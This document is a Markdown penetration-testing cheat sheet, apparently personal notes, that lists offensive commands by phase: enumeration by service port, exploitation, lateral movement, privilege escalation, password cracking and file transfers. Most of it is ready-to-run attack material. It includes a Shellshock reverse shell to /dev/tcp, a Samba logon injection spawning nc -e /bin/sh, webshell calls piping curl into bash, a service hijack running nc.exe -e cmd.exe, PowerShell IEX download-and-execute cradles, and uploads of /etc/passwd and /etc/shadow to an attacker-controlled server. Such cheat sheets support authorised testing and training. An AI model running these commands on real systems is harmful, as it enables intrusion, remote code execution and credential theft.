# Penetration Testing

Overview
---------
1. - [Passive Enumeration](#1---passive-enumeration)
2. - [Active Enumeration](#2---active-enumeration)
3. - [Exploitation](#3---exploitation)
4. - [Lateral Movement](#4---lateral-movement)
5. - [Privilege Escalation](#5---privilege-escalation)
6. - [Brute Force](#6---brute-force)
7. - [File Transfers](#7---file-transfers)
8. - [Restricted Shell Escapes](#8---restricted-shell-escapes)
9. - [Shells](#9---shells)
10. - [Evasion](#10---evasion)
11. - [Online Resources](#11---online-resources)
12. - [Browser Plugins](#12---browser-plugins)
13. - [Exploits](#13---exploits)
14. - [Exploit Research](#14---exploit-research)
   
#1. - Passive Enumeration
-----------------------------------------

- Searchcode

```
https://searchcode.com/
```

- Shodan

```
https://www.shodan.io/
$ for i in $(cat ip-addresses.txt);do shodan host $i;done	
```

- Certificate Search

```
https://crt.sh/
$ curl -s https://crt.sh/\?q\=<Target Domain Name>\&output\=json | jq .
$ curl -s https://crt.sh/\?q\=<Target Domain Name>\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```

- Google Dorks

```
intext:<company name> inurl:amazonaws.com
intext:<company name> inurl:blob.core.windows.net
```

- Whois

```
https://domain.glass/
```

- Cloud Bucket Search

```
https://buckets.grayhatwarfare.com/
```
     
#2. - Active Enumeration
-----------------------------------------

- Nmap

```
$ sudo nmap --script-updatedb
$ nmap -sn <IP address>
$ nmap -sC -sV -p- -Pn -A <IP address>
$ nmap -sC -sV -p- -Pn -A -sU <IP address>
$ nmap --top-ports=100 <IP address>
$ nmap <IP address> --script vuln
$ nmap -sV <IP address> --script banner
$ nmap -sV <IP address> --packet-trace	--reason
$ nmap <IP address> -S <Spoofed IP address> -e tun0
$ nmap <IP address> -D RND:5
$ nmap <IP address> --source-port <Spoofed port>
$ nmap <IP address> -oA scan
$ xsltproc target.xml -o target.html
```

- Nessus

```
$ dpkg -i Nessus-8.15.1-ubuntu910_amd64.deb
$ sudo systemctl start nessusd.service
https://localhost:8834
https://raw.githubusercontent.com/eelsivart/nessus-report-downloader/master/nessus6-report-downloader.rb
./nessus_downloader.rb
```

- OpenVAS

```
$ sudo apt-get install gvm && openvas
$ gvm-setup
$ gvm-start
https://github.com/TheGroundZero/openvasreporting
$ python3 -m openvasreporting -i report-2bf466b5-627d-4659-bea6-1758b43235b1.xml -f xlsx
```

- Netcat

```
$ nc -nv <IP address> <port>
```

- FTP (port 21)

```
$ ftp <IP address> (anonymous:anonymous)
ftp> dir
ftp> cd <folder>
ftp> get <file>
ftp> put <file>
ftp> exit
$ openssl s_client -connect <IP address>:21 -starttls ftp
$ wget -m --no-passive ftp://anonymous:anonymous@<IP address>
```

- SSH (port 22)

```
$ ssh <user>@<IP address>
$ ssh <user>@<IP address> -p <port>
$ chmod 600 id_rsa
$ ssh -i id_rsa <user>@<IP address>
$ ssh <user>@<IP address> -o PreferredAuthentications=password
$ ssh-audit.py <IP address>
```

- Telnet (port 23)

```
$ telnet <IP address>
```

- SMTP (port 25)

```
$ telnet <IP address> 25
VRFY root
```

- DNS (udp/port 53)

```
$ dig ns <domain.tld> @<nameserver>
$ dig mx <domain.tld> @<nameserver>
$ dig txt <domain.tld> @<nameserver>
$ dig CH TXT version.bind <domain.tld>
$ dig soa <domain.tld> @<nameserver>
$ dig any <domain.tld> @<nameserver>
$ dig axfr <domain.tld> @<nameserver>
$ for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.<domain.tld> @<nameserver> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
$ dnsenum --dnsserver <nameserver> --enum -p 0 -s 0 -o found_subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt <domain.tld>
$ for i in $(cat subdomainlist.txt);do host $i | grep "has address" | grep <Target Domain Name> | cut -d" " -f4 >> ip-addresses.txt;done
```

- TFTP (udp/port 69)

```
$ tftp <IP address>
tftp> get <file>
tftp> put <file>
```

- HTTP/HTTPS (port 80/443)

```
Right-Click -> View Page Source
https://<URL>/robots.txt
$ gobuster dir -w <wordlist> -u <URL>
$ gobuster dir -w <wordlist> -u <URL> -x php,html
$ gobuster vhost -w <wordlist> -u <URL>
$ gobuster dns -w <wordlist> -d <Domain Name>
$ ffuf -u <URL>/FUZZ -w <wordlist>
$ curl -IL <URL>
$ curl <URL> -H 'User-agent: zerodiumsystem("curl <IP address>");'
$ curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/<IP address>/443 0>&1" http://<IP address>/cgi-bin/user.sh
$ feroxbuster -w <wordlist> -u <URL>
$ wfuzz -c -w <wordlist> -u http://FUZZ.<domain>
$ nikto -h <IP address>
$ eyewitness -f <URL list.txt> --web
$ whatweb <IP address>
$ curl -v -X OPTIONS <IP address>
$ curl http://<IP address> --upload-file test.txt
$ curl -X PUT http://<IP address>/test.txt -d @test.txt
$ curl -X PUT http://<IP address>/test.txt --data-binary @cmdasp.aspx 
$ curl -X PUT http://<IP address>/test.txt -d @cmdasp.aspx 
$ curl -X MOVE -H 'Destination:http://<IP address>/cmdasp.aspx' http://<IP address>/test.txt
$ davtest -url http://<IP address>
$ cadaver http://<IP address>
dav:/ put cmdasp.aspx cmdasp.txt
dav:/ put cmdasp.txt cmdasp.aspx
```

- POP3 (port 110)

```
$ telnet <IP address> 110
USER admin
PASS admin
LIST
RETR 1
```

- RPCBIND (port 111)

```
$ rpcinfo -p <IP address>
```

- MSRPC (port 135)

```
$ wmiexec.py <user>:"<password>"@<IP address> "<command>"	
```

- SMB (port 137/139/445)

```
$ smbclient -N -L <IP address>
$ smbclient -L <IP address>
$ smbclient -L <IP address> -U <username>
$ smbclient \\\\<IP address>\\c$
$ smbclient \\\\<IP address>\\c$ -U <username>
$ smbmap -H <IP address>
$ smbmap -H <IP address> -u <username> -p <password>
smb: \> logon "/=`nc <IP address> <port> -e /bin/sh`"
smb: \> !ls
$ rpcclient -U "" <IP address>
$ for i in $(seq 500 1100);do rpcclient -N -U "" <IP address> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
$ samrdump.py <IP address>	
msf> use auxiliary/scanner/smb/smb_version
msf> use auxiliary/scanner/smb/smb_ms17_010
msf> use exploit/windows/smb/ms17_010_psexec	
msf> use exploit/windows/smb/ms17_010_eternalblue
msf> use exploit/windows/smb/ms08_067_netapi
msf> use exploit/multi/samba/usermap_script
msf> use exploit/windows/smb/psexec
$ enum4linux -a <IP address>
$ enum4linux-ng.py -A <IP address>
$ crackmapexec smb <IP address> --shares
$ crackmapexec smb <IP address> --shares -u '' -p ''
$ crackmapexec smb <IP address> --shares -u <username> -p '<password>'
$ crackmapexec winrm <IP address> -u <username> -p '<password>'
```

- IMAP (port 143)

```
$ telnet <IP address> 143
1 LOGIN username password
1 LIST "" *
1 FETCH <ID> all
```

- SNMP (udp/port 161)

```
$ snmpwalk -v 2c -c <community string> <IP address>
$ snmpwalk -v 2c -c public <IP address> 1.3.6.1.2.1.1.5.0
$ snmpwalk -v 2c -c private <IP address> 1.3.6.1.2.1.1.5.0
$ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <IP address>
$ braa <community string>@<IP address>:.1.*
```
- R-Services (port 512/513/514)

```
$ rlogin -l <username> <IP address>
$ rwho
$ rusers -al <IP address>
```

- IPMI (udp/port 623)

```
msf> use auxiliary(scanner/ipmi/ipmi_version)
msf> use auxiliary(scanner/ipmi/ipmi_dumphashes)	
```

- CUPS (port 631)

```
$ cupsctl ErrorLog="/etc/shadow"
$ curl http://<IP address>:631/admin/log/error_log?
use multi/escalate/cups_root_file_read
```

- Rsync (port 873)

```
$ rsync -av --list-only rsync://<IP address>
$ rsync -av --list-only rsync://<IP address>/<share>
$ rsync rsync://<IP address>/<share>/<filename> <filename>
$ rsync -av rsync:/<IP address>/<share>
```

- IMAPS (port 993)

```
$ curl -k 'imaps://<IP address>' --user <user>:<password>
$ openssl s_client -connect <IP address>:imaps
```

- POP3S (port 995)

```
$ openssl s_client -connect <IP address>:pop3s
```

- MSSQL (port 1433)

```
$ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
SQL> SELECT name from sys.databases
SQL> SELECT is_srvrolemember('sysadmin');
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell "whoami";
```

- Oracle TNS (port 1521)

```
$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
$ sudo mkdir -p /opt/oracle
$ sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
$ sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
$ export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
$ export PATH=$LD_LIBRARY_PATH:$PATH
$ source ~/.bashrc
$ cd ~
$ git clone https://github.com/quentinhardy/odat.git
$ cd odat/
$ pip install python-libnmap
$ git submodule init
$ git submodule update
$ pip3 install cx_Oracle
$ sudo apt-get install python3-scapy -y
$ sudo pip3 install colorlog termcolor passlib python-libnmap
$ sudo apt-get install build-essential libgmp-dev -y
$ pip3 install pycryptodome
$ ./odat.py -h

$ ./odat.py all -s <IP address>
$ ./odat.py utlfile -s <IP address> -d <database> -U <user> -P <password> --sysdba --putFile <file path> <file name> <output file path>
$ sqlplus <user>/<password>@<IP address>/<database>
$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
$ sqlplus <user>/<password>@<IP address>/<database> as sysdba
SQL> SELECT table_name from all_tables;
SQL> SELECT * from user_role_privs;
SQL> select name, password from sys.user$;
```

- NFS (port 2049)

```
$ showmount -e <IP address>
$ sudo mount -t nfs <IP address>:<mountable share> <target location> -o nolock
$ sudo umount <target location>
$ sudo useradd -u <UID> <user>
```

- MySQL (port 3306)

```
$ mysql -h <IP address> -u root
MySQL [(none)]> SELECT version();
MySQL [(none)]> SHOW databases;
MySQL [(none)]> USE <database name>;
MySQL [(none)]> SHOW tables;
MySQL [(none)]> SELECT * FROM <table name>;
MySQL [(none)]> SELECT * from <table name> where <column> = "<string>";
```

- RDP (port 3389)

```
$ xfreerdp /v:<IP address>
$ xfreerdp /v:<IP address> /u:Administrator
$ freerdp /v:<IP address> /cert:ignore /u:Administrator
$ rdp-sec-check.pl <IP address>
```

- PostgreSQL (port 5432)

```
$ psql -h <IP address> -U <username> -p <password>
<username>=# \l
<username>=# \c secrets
<username>=# \dt
<username>=# SELECT * FROM <table>;
```

- WinRM (port 5985)

```
$ evil-winrm -i <IP address> -u <username> -p <password>
```

- X11 (port 6000)

```
$ cat .Xauthority | base64
$ echo AQAADHN<...SNIP...>S0xAoNm/oZZ4/ | base64 -d > /tmp/.Xauthority
$ export XAUTHORITY=/tmp/.Xauthority
$ w
$ xwd -root -screen -silent -display :0 > /tmp/screen.xwd
$ convert screen.xwd screen.png
```

- Redis (port 6379)

```
$ redis-cli -h <IP address>
<IP address>:6379> select <db number e.g. 0>
<IP address>:6379> keys *
<IP address>:6379> get <key>
```

- MongoDB (port 27017/27117)

```
$ ./mongo mongodb://<IP address>:27017
> show dbs;
> use <db name>;
> show collections;
> db.<collection>.find().pretty();
$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<Object ID>")},{$set:{"x_shadow":"<SHA-512 hash>"}})'
```

#3. - Exploitation
-----------------------------------------

- Searchsploit

```
$ searchsploit <term>
```

- Metasploit

```
$ msfconsole
msf6 > show exploits
msf6 > show payloads
msf6 > search exploit eternalblue
msf6 > use exploit/windows/smb/ms17_010_psexec
msf6 exploit(windows/smb/ms17_010_psexec) > info
msf6 exploit(windows/smb/ms17_010_psexec) > options
msf6 exploit(windows/smb/ms17_010_psexec) > advanced
msf6 exploit(windows/smb/ms17_010_psexec) > show targets
msf6 exploit(windows/smb/ms17_010_psexec) > show encoders
msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS <IP address>
msf6 exploit(windows/smb/ms17_010_psexec) > set LHOST tun0
msf6 exploit(windows/smb/ms17_010_psexec) > check
msf6 exploit(windows/smb/ms17_010_psexec) > set autorunscript migrate -f
msf6 exploit(windows/smb/ms17_010_psexec) > exploit
msf6 exploit(windows/smb/ms17_010_psexec) > exploit -e shikata_ga_nai
msf6 > sessions -l
```

- Local File Inclusion (LFI)

```
http://<domain name>/<page>?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

- Remote File Inclusion (RFI)

```
sudo responder -I <network interface>
http://<domain name>/<page>?page=//<IP address>/somefile
```

- Server Side Template Injection (SSTI)

```
${7*7}
```

- Insecure Direct Object Reference (IDOR)

```
http://<IP address>/data/0
http://<IP address>/data/1
http://<IP address>/data/2
```

- Webshell

```
http://<domain name>/shell.php?cmd=id
http://<domain name>/shell.php?cmd=curl%20<IP address>:8000/shell.sh|bash
```

- Sqlmap

```
$ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>"
$ sqlmap -u '<URL>' --cookie="PHPSESSID=<PHPSESSID>" --os-shell
```

- Rogue-JNDI

```
$ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64 payload>} | {base64,-d}|{bash,-i}" --hostname "<IP address>"
```

- Tomcat

```
http://<IP address>:<port>/manager/html
tomcat:s3cret
use exploit/multi/http/tomcat_mgr_upload
```

- PRTG Network Monitor

```
C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.dat
https://github.com/shk0x/PRTG-Network-Monitor-RCE/blob/master/prtg-exploit.sh
use exploit/windows/http/prtg_authenticated_rce
```

#4. - Lateral Movement
-----------------------------------------

- Local Port Forwarding

```
$ ssh -L 1234:localhost:5432 <username>@<remote IP address>
```

- Dynamic Port Forwarding

```
$ ssh -D 1234 <username>@<remote IP address>
```

- Proxychains

```
Edit /etc/proxychains4.conf
$ proxychains <command>
```

- Chisel

```
https://github.com/jpillora/chisel
$ sudo ./chisel server -p 8000 --reverse
$ ./chisel client <IP address>:8000 R:631:127.0.0.1:631
```

- Socat

```
$ socat tcp-listen:9090,fork tcp:127.0.0.1:631 &
```

- Meterpreter

```
meterpreter> portfwd add -l 8082 -p 631 -r 127.0.0.1
```

- PsExec

```
$ python psexec.py <username>:<password>@<IP address>
$ python psexec.py <username>@<IP address>
```

#5. - Privilege Escalation
-----------------------------------------

- Sudo

```
$ sudo -l
$ sudo -u <user> /bin/bash
```

- SUID

```
https://github.com/Anon-Exploiter/SUID3NUM
```

- WinPEAS

```
https://github.com/carlospolop/PEASS-ng
```

- LinPEAS

```
https://github.com/carlospolop/PEASS-ng
```

- LinEnum

```
https://github.com/rebootuser/LinEnum
```

- Linuxprivchecker

```
https://github.com/sleventyeleven/linuxprivchecker
```

- Capabilities

```
$ getcap -r / 2>/dev/null
CAP_SETUID
```

- Python

```
>>> import os
>>> os.setuid(0)
>>> os.system("/bin/bash")
$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- Seatbelt

```
https://github.com/GhostPack/Seatbelt
```

- JAWS

```
https://github.com/411Hall/JAWS
```

- Weak Service

```
C:\> sc.exe config <service> binPath=C:\Windows\Temp\nc.exe -e cmd.exe <IP address> <port>"
C:\> sc.exe stop <service>
C:\> sc.exe start <service>
```

- Cron Jobs

```
$ ls /etc/crontab
$ ls /etc/cron.d
$ ls /var/spool/cron/crontabs/root
```

- Vulnerable Software

```
$ dpkg -l
C:\> dir "C:\Program Files"
C:\> dir "C:\Program Files (x86)"
```

- Exposed Credentials

```
$ cat .bash_history
PS C:\> Get-Content (Get-PSReadlineOption).HistorySavePath
```

- SSH Key Login

```
$ cat /home/user/.ssh/id_rsa
$ cat /root/.ssh/id_rsa
$ chmod 600 id_rsa
$  ssh <user>@<IP address> -i id_rsa
```

- SSH Authorized Keys

```
$ ssh-keygen -f key
$ cat key.pub
$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys
$ ssh <user>@<IP address> -i key
```

- Whoami

```
C:\> whoami /priv
```

- Windows Exploit Suggester

```
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
(On Kali) $ ./windows-exploit-suggester.py --update
$ install python-xlrd
$ pip install xlrd --upgrade

feed it "systeminfo" input, and point it to the microsoft database
$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt 
```

- Metasploit

```
msf> use post/multi/recon/local_exploit_suggester
```

#6. - Brute Force
-----------------------------------------

- HashID

```
$ hashid <hash>
```

- John The Ripper

```
$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
$ john --show hashes.txt
```

- Hydra

```
$ hydra -L <usernames.txt> -p '<password>' <IP address> ssh
```

- Zip2john

```
$ zip2john <ZIP file> > hashes.txt
```

- Hashcat

```
$ hashcat -a 0 -m 0 hashes.txt <wordlist>
```

#7. - File Transfers
-----------------------------------------

- Base64 Downloads (Kali -> Windows)

```
$ md5sum id_rsa
$ cat id_rsa |base64 -w 0;echo
PS C:\> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<base64_string>"))
PS C:\> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```

- Base64 Downloads (Kali -> Linux)

```
$ md5sum id_rsa
$ cat id_rsa |base64 -w 0;echo
$ echo -n '<base64_string>' | base64 -d > id_rsa
$ md5sum id_rsa
```

- Base64 Uploads (Windows -> Kali)

```
PS C:\> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash
PS C:\> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
$ echo <base64_string> | base64 -d > hosts
$ md5sum hosts 
```

- Base64 Uploads (Linux -> Kali)

```
$ md5sum id_rsa
$ cat id_rsa |base64 -w 0;echo
$ echo -n '<base64_string>' | base64 -d > id_rsa
$ md5sum id_rsa
```

- Netcat Downloads (Kali -> Windows)

```
$ sudo nc -nlvp -q 0 443 < file.txt
C:\> nc.exe -nv <IP address> 443 > file.txt

$ sudo nc -nlvp 443 > file.txt
C:\> nc.exe -q 0 <IP address> 443 < file.txt
```

- Ncat Downloads (Kali -> Linux)

```
$ sudo ncat -nlvp 443 --send-only < file.txt
$ ncat <IP address> 443 --recv-only > file.txt
OR
$ cat < /dev/tcp/<IP address>/443 > file.txt

$ sudo ncat -nlvp 443 --recv-only > file.txt
$ ncat --send-only <IP address> 443 < file.txt
```

- Netcat Uploads (Windows -> Kali)

```
C:\> nc.exe -nlvp 443 -q 0 < file.txt
$ nc -nv <IP address> 443 > file.txt

C:\> nc.exe -nlvp 443 > file.txt
$ nc -q 0 <IP address> 443 < file.txt
```

- Python Web Uploads over HTTPS (Linux -> Kali)

```
$ sudo python3 -m pip install --user uploadserver
$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
$ mkdir https && cd https
$ sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
$ curl -X POST https://<IP address>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

- Python3 Server (Kali -> Windows/Kali)

```
$ python3 -m http.server 8000
$ wget http://<IP address>:8000/exploit.sh -O exploit.sh
$ curl http://<IP address>:8000/exploit.sh -o exploit.sh
$ curl http://<IP address>:8000/exploit.sh | bash
```

- Python3 Downloads (Kali -> Linux)

```
$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

- Python3 Uploads (Linux -> Kali)

```
$ python3 -m uploadserver
$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

- Python2.7 Server (Kali -> Windows/Kali)

```
$ python2.7 -m SimpleHTTPServer 8000
$ wget http://<IP address>:8000/exploit.sh -O exploit.sh
$ curl http://<IP address>:8000/exploit.sh -o exploit.sh
$ curl http://<IP address>:8000/exploit.sh | bash
```

- Python2.7 Downloads (Kali -> Linux)

```
$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

- PHP Server (Kali -> Linux)

```
$ php -S 0.0.0.0:8000
$ wget http://<IP address>:8000/exploit.sh -O exploit.sh
$ curl http://<IP address>:8000/exploit.sh -o exploit.sh
$ curl http://<IP address>:8000/exploit.sh | bash
```

- PHP Downloads (Kali -> Linux)

```
$ php -r '$file = file_get_contents("http://<IP address>:8000/exploit.sh"); file_put_contents("exploit.sh",$file);'
$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

- Ruby Server (Kali -> Linux)

```
$ ruby -run -ehttpd . -p8000
$ wget http://<IP address>:8000/exploit.sh -O exploit.sh
$ curl http://<IP address>:8000/exploit.sh -o exploit.sh
$ curl http://<IP address>:8000/exploit.sh | bash
```

- Ruby Downloads (Kali -> Linux)

```
$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

- Perl Downloads (Kali -> Linux)

```
$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

- SCP Downloads (Kali -> Windows)

```
$ sudo systemctl enable ssh
$ sudo systemctl start ssh
$ scp <user>@<IP address>:/tmp/exploit.exe C:\Temp\exploit.exe
```

- SCP Downloads (Kali -> Linux)

```
$ sudo systemctl enable ssh
$ sudo systemctl start ssh
$ scp <user>@<IP address>:/tmp/exploit.sh .
```

- SCP Uploads (Windows -> Kali)

```
C:\> scp C:\Temp\exploit.exe <user>@<IP address>:/tmp/exploit.exe
```

- SCP Uploads (Linux -> Kali)

```
C:\> scp /tmp/exploit.sh <user>@<IP address>:/tmp/exploit.sh
```

- OpenSSL Download (Kali -> Linux)

```
$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
$ openssl s_client -connect <IP address>:80 -quiet > LinEnum.sh
```

- OpenSSL Encrypted Download (Kali -> Linux)

```
$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

- Nginx Uploads (Linux -> Kali)

```
$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory
$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
# Create the Nginx configuration file by creating the file /etc/nginx/sites-available/upload.conf with the contents
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}

$ sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
$ sudo systemctl restart nginx.service
$ tail -2 /var/log/nginx/error.log
$ ss -lnpt | grep 80
$ ps -ef | grep <PID>
$ sudo rm /etc/nginx/sites-enabled/default
$ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
$ sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```

- PowerShell DownloadFile (Kali -> Windows)

```
PS C:\> (New-Object Net.WebClient).DownloadFile('http://<IP address>:8000/exploit.ps1','C:\Users\Public\Downloads\exploit.ps1')
C:\> powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP address>/exploit.exe','C:\Users\Offsec\Desktop\new-exploit.exe')"
```

- PowerShell Invoke-WebRequest (Kali -> Windows)

```
PS C:\> Invoke-WebRequest http://<IP address>:8000/exploit.ps1 -OutFile exploit.ps1
PS C:\> iwr http://<IP address>:8000/exploit.ps1 -OutFile exploit.ps1
PS C:\> Invoke-WebRequest http://<IP address>/exploit.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "exploit.exe"

# Internet Explorer first-launch error
PS C:\> Invoke-WebRequest http://<IP address>:8000/exploit.ps1 -UseBasicParsing | IEX

# SSL/TLS secure channel error
PS C:\> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

- PowerShell WinHTTPRequest (Kali -> Windows)

```
PS C:\> $h=new-object -com WinHttp.WinHttpRequest.5.1;
PS C:\> $h.open('GET','http://<IP address>/nc.exe',$false);
PS C:\> $h.send();
PS C:\> iex $h.ResponseText
```

- Msxml2 (Kali -> Windows)

```
PS C:\> $h=New-Object -ComObject Msxml2.XMLHTTP;
PS C:\> $h.open('GET','http://<IP address>/nc.exe',$false);
PS C:\> $h.send();
PS C:\> iex $h.responseText
```

- PowerShell DownloadString (Download & Execute Cradle - Fileless) (Kali -> Windows)

```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://<IP address>:8000/exploit.ps1')
https://gist.github.com/HarmJ0y/bb48307ffa663256e239
```

- PowerShell Web Uploads (Windows -> Kali)

```
$ pip3 install uploadserver
$ python3 -m uploadserver
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\> Invoke-FileUpload -Uri http://<IP address>/upload -File C:\Windows\System32\drivers\etc\hosts
```

- PowerShell Base64 Web Uploads (Windows -> Kali)

```
PS C:\> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\> Invoke-WebRequest -Uri http://<IP address>:443/ -Method POST -Body $b64s
$ nc -nlvp 8000
$ echo <base64> | base64 -d -w 0 > hosts
```

- PowerShell Remoting (Windows -> Windows)

```
PS C:\> Test-NetConnection -ComputerName <computer_name> -Port 5985
PS C:\> $Session = New-PSSession -ComputerName <computer_name>
PS C:\> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
PS C:\> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

- PowerShell Encrypted Download (Kali -> Windows)

```
# https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1
PS C:\> Import-Module .\Invoke-AESEncryption.ps1
PS C:\> Invoke-AESEncryption -Mode Encrypt -Key "<password>" -Path .\scan-results.txt
```

- SMB Downloads (Kali -> Windows)

```
$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
C:\> net use n: \\<IP address>\smbshare /user:test test
C:\> copy n:\exploit.exe
OR
C:\> copy \\<IP address>\a\whoami.exe C:\Windows\Temp\whoami.exe
OR
$ smbserver.py a /usr/share/windows-binaries/
```

- SMB Uploads WebDav (Windows -> Kali)

```
$ sudo pip3 install wsgidav cheroot
$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
C:\> dir \\<IP address>\DavWWWRoot
C:\> copy C:\Users\Public\Downloads\exploit.exe \\<IP address>\DavWWWRoot\
```

- FTP Downloads (Kali -> Windows)

```
$ sudo pip3 install pyftpdlib
$ sudo python3 -m pyftpdlib --port 21
PS C:\> (New-Object Net.WebClient).DownloadFile('ftp://<IP address>/file.txt', 'C:\Users\Public\ftp-file.txt')
```

- FTP Uploads (Windows -> Kali)

```
$ sudo python3 -m pyftpdlib --port 21 --write
PS C:\> (New-Object Net.WebClient).UploadFile('ftp://<IP address>/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

- FTP Downloads Non-Interactively (Kali -> Windows)

```
C:\> echo open 192.168.49.128 > ftpcommand.txt
C:\> echo USER anonymous >> ftpcommand.txt
C:\> echo binary >> ftpcommand.txt
C:\> echo GET file.txt >> ftpcommand.txt
C:\> echo bye >> ftpcommand.txt
C:\> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\>cat file.txt
This is a test file
```

- FTP Uploads Non-Interactively (Windows -> Kali)

```
C:\> echo open 192.168.49.128 > ftpcommand.txt
C:\> echo USER anonymous >> ftpcommand.txt
C:\> echo binary >> ftpcommand.txt
C:\> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\> echo bye >> ftpcommand.txt
C:\> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.

ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

- Wget (Kali -> Linux)

```
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

- Curl (Kali -> Linux)

```
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o /tmp/LinEnum.sh
$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

